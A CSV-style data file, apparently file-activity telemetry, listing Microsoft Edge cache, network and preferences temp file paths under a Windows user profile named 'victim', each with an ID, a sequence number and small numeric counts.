a76b33c6-6f46-453b-afa2-49431a4497be,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\671feb07fca38274_1'},688,False,1,1,2,1,1,2
81c7653c-b64c-4f1c-bf3f-98d0fea6bb7a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\39a38712b9fb879d_0'},689,False,1,1,2,1,1,2
f7c11046-36b6-4f1d-95f4-21fff3830193,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\39a38712b9fb879d_1'},690,False,1,1,2,1,1,2
9267a956-d5cd-4d6d-8446-89dbefc65194,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_da03453aa0243259_0_1'},691,False,2,0,2,2,0,2
d900b9bf-3108-4b1f-9532-a6fa2b1bc7d1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_da03453aa0243259_1_1'},692,False,2,0,2,2,0,2
9247558b-cc3f-4254-b32a-ca90471ce98a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_faee6d8d2c8b7b44_0_1'},693,False,2,0,2,2,0,2
5dca714a-e734-407a-af98-8c716e7b36be,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_faee6d8d2c8b7b44_1_1'},694,False,2,0,2,2,0,2
3e0f0f30-ded0-41d4-b6b8-27582dc5aeeb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_28faffd4bc3eef38_0_1'},695,False,2,0,2,2,0,2
509ed0c9-5248-4faa-a1e2-f19e14f2132a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_28faffd4bc3eef38_1_1'},696,False,2,0,2,2,0,2
fd3667b2-3740-49d6-a62f-612dfccb2464,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_5ef1c56e79993418_0_1'},697,False,2,0,2,2,0,2
1cfd1ead-1908-4e84-ae01-514c7ee5156d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_5ef1c56e79993418_1_1'},698,False,2,0,2,2,0,2
be073952-d38a-47e5-bf28-8afa29d2303c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_dcb2dbe275c48c9e_0_1'},699,False,2,0,2,2,0,2
d46299a2-214a-416a-ab26-4cecc4be2e8c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_dcb2dbe275c48c9e_1_1'},700,False,2,0,2,2,0,2
7c508575-2f3b-44ed-883e-9b1f526d7bdc,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_671feb07fca38274_1_1'},702,False,2,0,2,2,0,2
38fe3431-efd0-49d4-8baa-4fbf3960ce0e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_06819d33dd31b502_0_1'},703,False,2,0,2,2,0,2
2d041b58-7877-478a-bc41-c66ebbbad648,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_06819d33dd31b502_1_1'},704,False,2,0,2,2,0,2
411d2468-c066-4b82-893e-5aa645dd6ce8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_9a71944d0c3a81ca_0_1'},705,False,2,0,2,2,0,2
59ef8694-c37e-4b98-93f5-01b71a0cfa89,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_9a71944d0c3a81ca_1_1'},706,False,2,0,2,2,0,2
d5f69c08-4f94-4b99-ae9e-e33bcd5e3a12,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_3a0508414b5e7a05_0_1'},707,False,2,0,2,2,0,2
c88efd22-e38c-4b99-a0ed-147a3f148f00,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_3a0508414b5e7a05_1_1'},708,False,2,0,2,2,0,2
f6d581e6-dff2-41ef-9469-21a2a34827d6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_cc1c649c486b5cfd_0_1'},709,False,2,0,2,2,0,2
db3ec6bd-23b1-42a4-821d-88564bd59a22,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_cc1c649c486b5cfd_1_1'},710,False,2,0,2,2,0,2
d56a48aa-10ba-4637-a671-7b3e3591ae2a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_ce35b503af635734_0_1'},711,False,2,0,2,2,0,2
f62fdb06-cbcc-4245-beb0-860ca735672a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_ce35b503af635734_1_1'},712,False,2,0,2,2,0,2
3508274f-ed1e-4cb6-84e8-436abfdfd20b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_e49f5c1fe5b7ebde_0_1'},713,False,2,0,2,2,0,2
5dea4a75-9762-4f2f-99d6-b3e07a0771ec,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_e49f5c1fe5b7ebde_1_1'},714,False,2,0,2,2,0,2
4beb52d8-582e-41d8-bf0c-5037cbfa38e7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_34651f1f5e3962e1_0_1'},715,False,2,0,2,2,0,2
bc1074b4-bbe3-4d26-bd5f-d2393b0d20e9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_34651f1f5e3962e1_1_1'},716,False,2,0,2,2,0,2
954da94c-958e-4af7-9ded-048d7ca19452,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_c0ecc04badf9fe4e_0_1'},717,False,2,0,2,2,0,2
18d9718f-9725-44f7-bf89-c34bc8086a48,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_c0ecc04badf9fe4e_1_1'},718,False,2,0,2,2,0,2
020841ce-af93-4448-bbcc-27fd5d75c991,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_7c1a4ccbfe4649fb_0_1'},719,False,2,0,2,2,0,2
4bf091b6-fe8f-42fe-aec1-7aeee1488db5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_7c1a4ccbfe4649fb_1_1'},720,False,2,0,2,2,0,2
9f418a65-4c19-4249-af20-db746c898a74,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_63e665bfcc49a593_0_1'},721,False,2,0,2,2,0,2
1daba4c2-360c-4530-a93c-3feec2ad51b1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_63e665bfcc49a593_1_1'},722,False,2,0,2,2,0,2
99c6cc9c-ab94-4dbb-ad00-da53b351c2dd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_2e42c035390fca99_0_1'},723,False,2,0,2,2,0,2
630749b6-12b9-4db0-a576-ef2525ee0a91,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_2e42c035390fca99_1_1'},724,False,2,0,2,2,0,2
92a8c8b5-340c-4e1d-9748-31790712eefb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_eeed066dc4dfd368_0_1'},725,False,2,0,2,2,0,2
5ce1835a-b4bd-4eed-9511-0abc0e86d307,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_eeed066dc4dfd368_1_1'},726,False,2,0,2,2,0,2
7bc84fee-e834-4acf-8527-cb05bd2fa803,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_8200563d2cde530a_0_1'},727,False,2,0,2,2,0,2
9b28c39b-8978-49c0-b47f-038f7e7fb7ab,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_8200563d2cde530a_1_1'},728,False,2,0,2,2,0,2
ba9620e8-2a21-4596-b115-4d2c02456a40,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_36535ee8017d40d1_0_1'},729,False,2,0,2,2,0,2
03f1b66c-4dbc-4cdf-9e47-3e385a518f32,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_36535ee8017d40d1_1_1'},730,False,2,0,2,2,0,2
9d13b055-84e6-4c0f-8794-d3a9e794685e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_1a403dabc394cf65_0_1'},731,False,2,0,2,2,0,2
0b34b6d0-c1c4-4d2a-9ee4-e2ab5bdf3417,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_1a403dabc394cf65_1_1'},732,False,2,0,2,2,0,2
1642f577-6dd2-4d38-a526-19b989f79817,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_8e38ffd9624144d3_0_1'},733,False,2,0,2,2,0,2
e3b1b8cc-21ed-4a6f-bfbe-44c1cad02b79,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_8e38ffd9624144d3_1_1'},734,False,2,0,2,2,0,2
7db3d0c2-279b-4395-89af-9daffc4db59c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_ea153f4c5a8ed11e_0_1'},735,False,2,0,2,2,0,2
021bd138-83dc-492a-8346-1911fc219c77,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_ea153f4c5a8ed11e_1_1'},736,False,2,0,2,2,0,2
d1661497-2e48-4c4b-bec5-09b16f219bf6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_9c548a46a9ecc3f3_0_1'},737,False,2,0,2,2,0,2
9026f256-739f-47e3-9f5d-7d7ce7be5c36,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_9c548a46a9ecc3f3_1_1'},738,False,2,0,2,2,0,2
d98f9c1b-2612-4087-a994-f62f5a6e8886,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_aa2f6ea3c3f10dd3_0_1'},739,False,2,0,2,2,0,2
2f42fb24-0339-4886-a23f-0bd8faea209e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_aa2f6ea3c3f10dd3_1_1'},740,False,2,0,2,2,0,2
aa4655b3-f036-4754-955e-ca1d4474cd8b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_e94f5e78d6937404_0_1'},741,False,2,0,2,2,0,2
eeb2361d-317e-436c-abf9-ed285666d7ac,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_e94f5e78d6937404_1_1'},742,False,2,0,2,2,0,2
8840ed1d-9981-49b2-82e4-30def2e04594,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_6cb67d97a6b3818e_0_1'},743,False,2,0,2,2,0,2
8a4c57eb-1bb8-4c89-87c6-0142a3c9c809,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_6cb67d97a6b3818e_1_1'},744,False,2,0,2,2,0,2
d88ba242-37d2-4db4-bd3b-508e42770a29,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_cbcb980587d54e76_0_1'},745,False,2,0,2,2,0,2
915869e2-adbd-4eeb-a399-fbdb3c090e85,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_cbcb980587d54e76_1_1'},746,False,2,0,2,2,0,2
69e1c94b-c42f-4c86-9d9e-86d744bf6a71,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_0e3f91883f72a37f_0_1'},747,False,2,0,2,2,0,2
eaf179b3-ff50-4a95-b820-665367b7ea6b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_0e3f91883f72a37f_1_1'},748,False,2,0,2,2,0,2
72fc5410-7c8a-46db-acd2-7da6e647dae9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_6822ccb717ca4e3d_0_1'},749,False,2,0,2,2,0,2
6703f760-ed1d-42d7-a67a-a92120cc89b0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_6822ccb717ca4e3d_1_1'},750,False,2,0,2,2,0,2
99c0e84b-6e0a-4bee-a111-aa833c7ce626,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_efaf6b65ee30e35c_0_1'},751,False,2,0,2,2,0,2
e392e6f7-a84c-48ee-bdd5-c5cbab2ad205,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_efaf6b65ee30e35c_1_1'},752,False,2,0,2,2,0,2
8107ff59-3cf6-47d7-8d09-f6300c0d0e23,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_9abc299c721fc6c8_0_1'},753,False,2,0,2,2,0,2
41672061-a9bb-46ec-96d6-ec8e7a682264,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_9abc299c721fc6c8_1_1'},754,False,2,0,2,2,0,2
7fffc81b-f4f9-4e5d-9721-b105b7e03f54,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_d8d32a83553fe5a8_0_1'},755,False,2,0,2,2,0,2
bbb14c36-f6c2-4b0b-a07e-5184d5540e74,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_d8d32a83553fe5a8_1_1'},756,False,2,0,2,2,0,2
f349329f-2b2d-467a-968e-d135b175616d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_fd7a9732cf9d29af_0_1'},757,False,2,0,2,2,0,2
2e285501-3619-48e7-9b53-e6fd74a11cf6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_fd7a9732cf9d29af_1_1'},758,False,2,0,2,2,0,2
22c4e0ec-aa21-44c4-bbd4-38cdf40ee7c2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_781fb11327496ef5_0_1'},759,False,2,0,2,2,0,2
b1a0ed17-9c86-41a7-b0f1-49f642d21736,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_781fb11327496ef5_1_1'},760,False,2,0,2,2,0,2
afc92ce6-4c19-4c0a-a5b9-d3b7a0aa9cd5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_39a38712b9fb879d_0_1'},761,False,2,0,2,2,0,2
8e423da5-8687-46dd-8eb9-86c15d4078de,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_39a38712b9fb879d_1_1'},762,False,2,0,2,2,0,2
ff583e10-d5dd-4f6a-9689-949ce3ac0b98,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_c313000bd77955e3_0_1'},763,False,2,0,2,2,0,2
0daaebb0-04b8-4add-830d-386dae4aca6e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_c313000bd77955e3_1_1'},764,False,2,0,2,2,0,2
8cee0e9b-917f-4355-a0de-f2d72a1fc02d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_40eb8c22f2eba043_0_1'},765,False,2,0,2,2,0,2
82fe4836-cb34-4533-8fe0-500fad70176a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_40eb8c22f2eba043_1_1'},766,False,2,0,2,2,0,2
7940a063-7bcf-48ab-b81b-17acf528da19,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_71900f6c184705dc_0_1'},767,False,2,0,2,2,0,2
a44196b5-d5bc-48b6-9d4d-b8908eeb3667,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_71900f6c184705dc_1_1'},768,False,2,0,2,2,0,2
cc2f14a8-46df-4a5f-a146-a4fc0139bfe7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\6ec67dda-f7e2-4cfe-98c4-183cd1af86e2.tmp'},770,False,1,1,2,1,1,2
d7d1a3f0-957e-4152-a1ee-647e76e37df0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\TransportSecurity~RF16d14f.TMP'},772,False,2,0,2,2,0,2
0db29ece-ab7d-4cd5-9664-5c173ca3ffc9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\5691a1fa-0f32-4047-a50e-ef4f8369c059.tmp'},774,False,1,1,2,1,1,2
48a5f495-99b2-4ac6-935d-46187151dac5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF16d825.TMP'},776,False,2,0,2,2,0,2
